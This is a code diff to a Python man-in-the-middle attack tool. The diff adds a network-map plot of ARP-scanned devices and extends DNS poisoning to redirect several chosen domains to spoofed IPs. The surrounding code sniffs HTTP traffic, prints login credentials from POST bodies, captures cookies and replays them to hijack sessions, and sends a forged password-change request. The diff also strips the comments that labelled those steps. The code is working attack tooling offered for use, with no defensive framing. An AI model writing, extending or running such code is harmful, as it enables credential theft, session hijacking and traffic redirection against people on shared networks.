@@ -12,6 +12,8 @@ import ctypes
 import subprocess
 import requests
 import re
+import networkx as nx
+import matplotlib.pyplot as plt
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -32,9 +34,28 @@ parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
 opts = parser.parse_args()
 
+# Network Mapping
+def plot_network_map(devices):
+    G = nx.Graph()
+    for ip, mac, vendor in devices:
+        G.add_node(ip, label=f"{ip}\n({mac})")
+    
+    for ip1, mac1, vendor1 in devices:
+        for ip2, mac2, vendor2 in devices:
+            if ip1 != ip2:
+                G.add_edge(ip1, ip2)
+
+    pos = nx.spring_layout(G)
+    nx.draw(G, pos, with_labels=True, node_size=2000, node_color="skyblue", font_size=10, font_weight="bold")
+    labels = nx.get_node_attributes(G, 'label')
+    nx.draw_networkx_labels(G, pos, labels, font_size=10)
+    plt.title("Network Topology")
+    plt.show()
+
 def arp_scan(network, iface):
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                  timeout=5, iface=iface, verbose=False)
+    devices = []
     print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
     for i in ans:
         mac = i.answer[ARP].hwsrc
@@ -43,10 +64,13 @@ def arp_scan(network, iface):
             vendor = MacLookup().lookup(mac)
         except VendorNotFoundError:
             vendor = 'unrecognized device'
+        devices.append((ip, mac, vendor))
         print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
     print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
+    plot_network_map(devices)
     return input('\nPick a device IP: ')
 
+# DNS Spoofing for Multiple Targets
 class Device:
     def __init__(self, routerip, targetip, iface):
         self.routerip = routerip
@@ -91,7 +115,6 @@ class Device:
                         except Exception:
                             pass
 
-                    # Capture credentials
                     if "POST" in raw_data:
                         if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
                            any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
@@ -100,20 +123,15 @@ class Device:
                                 if '=' in line and len(line) < 100:
                                     print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
-                    # Capture cookies and attempt advanced hijacking
                     if "Set-Cookie:" in raw_data:
                         cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                         print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
                         
-                        # Advanced session hijacking (attempting session fixation)
                         session = requests.Session()
                         session.cookies.set('session', cookies)
-                        
-                        # Attempt accessing a known target page
                         response = session.get(url)
                         print(f"{Fore.CYAN}Hijacked Session Response: {response.status_code} {url}{Style.RESET_ALL}")
                         
-                        # CSRF Attack: Example to send malicious request
                         csrf_url = f"{url}/change-password"
                         csrf_data = {
                             'old_password': 'password123',
@@ -135,19 +153,20 @@ class Device:
         subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
-    def dns_poison(self, spoof_ip):
+    def dns_poison(self, spoof_ips):
         import netfilterqueue  # Import only when DNS poisoning is needed
         
         def dns_pkt_callback(pkt):
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
-                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
-                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
-                send(spoofed_pkt, iface=self.iface, verbose=False)
-                print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
-        
-        # Set up NFQUEUE for DNS packets
+                target_ip = pkt[DNS].qd.qname.decode('utf-8').strip('.')
+                if target_ip in spoof_ips:
+                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ips[target_ip]))
+                    send(spoofed_pkt, iface=self.iface, verbose=False)
+                    print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ips[target_ip]}{Style.RESET_ALL}')
+
         nfqueue = netfilterqueue.NetfilterQueue()
         nfqueue.bind(0, dns_pkt_callback)
         print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
@@ -167,8 +186,14 @@ class Device:
             elif choice == 2:
                 self.http_sniff()
             elif choice == 3:
-                spoof_ip = input(f'{Fore.RED}Enter spoofed IP: {Style.RESET_ALL}')
-                self.dns_poison(spoof_ip)
+                spoof_ips = {}
+                while True:
+                    target = input(f'{Fore.RED}Enter target domain (or "done" to finish): {Style.RESET_ALL}')
+                    if target == "done":
+                        break
+                    ip = input(f'{Fore.RED}Enter spoofed IP for {target}: {Style.RESET_ALL}')
+                    spoof_ips[target] = ip
+                self.dns_poison(spoof_ips)
             elif choice == 4:
                 self.arp_sniff()
             elif choice == 5:
